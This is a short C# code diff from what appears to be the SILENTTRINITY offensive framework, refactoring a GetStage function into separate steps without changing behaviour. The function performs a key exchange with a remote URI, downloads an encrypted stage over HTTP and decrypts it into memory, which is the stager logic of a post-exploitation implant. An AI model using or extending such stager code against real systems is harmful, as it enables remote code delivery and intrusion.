@@ -41,7 +41,9 @@ namespace SILENTTRINITY.Utilities
 
             public static MemoryStream GetStage(Uri uri)
             {
-                return new MemoryStream(Crypto.Decrypt(Crypto.KeyExchange(uri), Http.Get(uri)));
+                var key = Crypto.KeyExchange(uri);
+                var stage = Crypto.Decrypt(key, Http.Get(uri));
+                return new MemoryStream(stage);
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
